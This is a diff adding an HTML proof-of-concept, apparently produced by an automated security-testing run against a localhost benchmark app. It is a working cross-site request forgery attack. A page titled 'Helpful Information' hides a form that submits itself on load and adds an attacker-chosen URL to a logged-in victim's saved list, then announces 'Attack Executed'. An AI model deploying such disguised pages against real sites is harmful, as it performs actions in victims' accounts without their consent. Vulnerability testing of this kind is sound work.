@@ -1,0 +1,42 @@
+<!-- 
+POC: HTML-based CSRF POC that demonstrates how an attacker can craft a malicious webpage to automatically add a URL to a user's saved list without CSRF token protection
+Target: ./repo
+Created: 2025-12-01T15:58:10.165Z
+Session: benchmark-XBEN-094-24-minbx06k
+
+To test this POC:
+1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-094-24-minbx06k/pocs/poc_csrf_add_url_v2.html
+2. Or serve it and navigate to the target application
+3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Helpful Information</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <p>Please wait while we load the content...</p>
+    
+    <!-- Hidden form to perform CSRF attack on /add_url endpoint -->
+    <form id="csrf-form" action="http://localhost:5000/add_url" method="POST" style="display:none;">
+        <input type="hidden" name="url" value="http://attacker.com/malicious">
+    </form>
+    
+    <script>
+        // Automatically submit the hidden form when page loads
+        // This simulates an attacker's malicious webpage
+        window.onload = function() {
+            console.log("[*] CSRF Attack Initiated");
+            console.log("[*] Target endpoint: http://localhost:5000/add_url");
+            console.log("[*] Malicious URL being added: http://attacker.com/malicious");
+            console.log("[*] Request will be sent with user's credentials (cookies)");
+            document.getElementById('csrf-form').submit();
+            
+            // Display feedback to attacker
+            document.body.innerHTML = '<h1>Attack Executed</h1><p>If the user was logged in to the target application, the malicious URL has been added to their saved list without their consent.</p><p><strong>CSRF Vulnerability Confirmed:</strong> No CSRF token required</p>';
+        };
+    </script>
+</body>
+</html>
